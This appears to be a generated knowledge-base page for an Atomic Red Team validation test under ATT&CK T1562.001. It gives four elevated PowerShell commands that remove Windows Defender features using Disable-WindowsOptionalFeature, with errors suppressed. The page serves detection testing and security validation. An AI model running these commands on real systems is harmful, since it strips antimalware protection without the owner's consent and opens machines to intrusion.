---
atomic_guid: "f542ffd3-37b4-4528-837f-682874faa012"
title: "Disable Windows Defender with PwSh Disable-WindowsOptionalFeature"
framework: "atomic"
generated: "true"
attack_technique_id: "T1562.001"
attack_technique_name: "Impair Defenses: Disable or Modify Tools"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.yaml"
build_date: "2026-04-26 17:02:13"
executor: "powershell"
aliases:
  - "f542ffd3-37b4-4528-837f-682874faa012"
  - "Disable Windows Defender with PwSh Disable-WindowsOptionalFeature"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Disable Windows Defender with PwSh Disable-WindowsOptionalFeature

The following Atomic will attempt to disable Windows-Defender using the built in PowerShell cmdlet Disable-WindowsOptionalFeature, Deployment Image Servicing and Management tool. 
Similar to DISM.exe, this cmdlet is used to enumerate, install, uninstall, configure, and update features and packages in Windows images.
A successful execution will not standard-out any details. Remove the quiet switch if verbosity is needed.
This method will remove Defender and it's packages.
Reference: https://docs.microsoft.com/en-us/powershell/module/dism/disable-windowsoptionalfeature?view=windowsserver2022-ps

## Metadata

- Atomic GUID: f542ffd3-37b4-4528-837f-682874faa012
- Technique: T1562.001: Impair Defenses: Disable or Modify Tools
- Platforms: windows
- Executor: powershell
- Elevation Required: True
- Source Path: atomics/T1562.001/T1562.001.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1562-impair_defenses|T1562.001]]

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
Disable-WindowsOptionalFeature -Online -FeatureName "Windows-Defender-Gui" -NoRestart -ErrorAction Ignore
Disable-WindowsOptionalFeature -Online -FeatureName "Windows-Defender-Features" -NoRestart -ErrorAction Ignore
Disable-WindowsOptionalFeature -Online -FeatureName "Windows-Defender" -NoRestart -ErrorAction Ignore
Disable-WindowsOptionalFeature -Online -FeatureName "Windows-Defender-ApplicationGuard" -NoRestart -ErrorAction Ignore
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.yaml)
